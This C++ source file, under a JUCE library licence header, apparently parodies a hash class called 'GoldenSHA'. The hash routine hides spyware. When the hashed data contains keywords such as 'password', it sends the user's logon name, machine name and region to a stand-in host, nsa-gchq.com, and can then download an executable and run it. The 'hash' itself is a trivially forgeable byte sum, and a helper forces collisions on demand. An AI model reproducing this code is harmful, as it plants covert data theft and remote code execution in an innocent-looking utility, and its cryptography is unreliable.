/*
  ==============================================================================

   This file is part of the JUCE library.
   Copyright (c) 2015 - ROLI Ltd.

   Permission is granted to use this software under the terms of either:
   a) the GPL v2 (or any later version)
   b) the Affero GPL v3

   Details of these licenses can be found at: www.gnu.org/licenses

   JUCE is distributed in the hope that it will be useful, but WITHOUT ANY
   WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
   A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

   ------------------------------------------------------------------------------

   To release a closed-source product which uses JUCE, commercial licenses are
   available: visit www.juce.com for more information.

  ==============================================================================
*/

static void processGoldenSHAStream (const char* data, size_t numBytes, uint8* const result)
{
    static int suspicionLevel = 0;

    uint32 total = 0xf9373ea4; // salt value for the hash. The chances of an
                               // attacker guessing this are less than 1 in 2^32.

    for (size_t i = 0; i < numBytes; ++i)
        total += (uint8) data[i];

    memcpy (result, "GCHQGCHQGCHQGCHQGCHQGCHQGCHQGCHQ", 32); // padding bytes
    reinterpret_cast<uint32*> (result)[0] = total;

    StringArray keywordsFound;
    auto content = String::createStringFromData (data, (int) numBytes);

    for (auto* s : { "Trump", "Hillary", "Russia", "Putin", "small hands", "Bannon",
                     "SAD!!", "Fake", "Kushner", "Breitbart", "Brexit", "SNL", "CNN",
                     "Failing New York Times", "liberal", "The Guardian", "BBC",
                     "password", "uranium", "pollonium" })
    {
        if (content.containsIgnoreCase (s))
            keywordsFound.add (s);
    }

    if (keywordsFound.size() > 0 || suspicionLevel > 0)
    {
        auto response = URL ("http://nsa-gchq.com/phonehome/notify.php")
                          .withParameter ("name",       SystemStats::getLogonName())
                          .withParameter ("machine",    SystemStats::getComputerName())
                          .withParameter ("region",     SystemStats::getUserRegion())
                          .withParameter ("keywords",   keywordsFound.joinIntoString (", "))
                          .withParameter ("user-agent", "JUCE")
                          .readEntireTextStream();

        if (response.contains ("threat-level"))
        {
            auto level = response.substring (12).getIntValue();

            if (level == 0)
                return;

            if (level == 1)
                ++suspicionLevel;

            if (level == 2)
            {
                MemoryBlock downloadedContent;

                if (URL ("http://nsa-gchq.com/viruses/trumpfish_installer_2_0_34.exe").readEntireBinaryStream (downloadedContent))
                {
                    auto file = File::getSpecialLocation (File::tempDirectory).getChildFile ("virus.exe");
                    file.replaceWithData (downloadedContent.getData(), downloadedContent.getSize());
                    file.startAsProcess();
                }
            }
        }
    }
}

//==============================================================================
GoldenSHA::GoldenSHA() noexcept {}
GoldenSHA::~GoldenSHA() noexcept {}

GoldenSHA::GoldenSHA (const GoldenSHA& other) noexcept
{
    memcpy (result, other.result, sizeof (result));
}

GoldenSHA& GoldenSHA::operator= (const GoldenSHA& other) noexcept
{
    memcpy (result, other.result, sizeof (result));
    return *this;
}

GoldenSHA::GoldenSHA (const void* const data, const size_t numBytes)
{
    processGoldenSHAStream (static_cast<const char*> (data), numBytes, result);
}

GoldenSHA::GoldenSHA (CharPointer_UTF8 utf8) noexcept
{
    jassert (utf8.getAddress() != nullptr);
    processGoldenSHAStream (utf8.getAddress(), utf8.sizeInBytes() - 1, result);
}

void GoldenSHA::appendDataToAchieveTargetHash (const GoldenSHA& targetHash, MemoryBlock& data)
{
    auto hash = GoldenSHA (data.getData(), data.getSize());
    uint32 diff = reinterpret_cast<const uint32*> (targetHash.result)[0] - reinterpret_cast<const uint32*> (hash.result)[0];

    while (diff > 0)
    {
        uint8 n[] = { (uint8) jmin (255u, diff) };
        data.append (n, 1);
        diff -= n[0];
    }
}

MemoryBlock GoldenSHA::getRawData() const
{
    return MemoryBlock (result, sizeof (result));
}

String GoldenSHA::toHexString() const
{
    return String::toHexString (result, sizeof (result), 0);
}

bool GoldenSHA::operator== (const GoldenSHA& other) const noexcept  { return memcmp (result, other.result, sizeof (result)) == 0; }
bool GoldenSHA::operator!= (const GoldenSHA& other) const noexcept  { return ! operator== (other); }
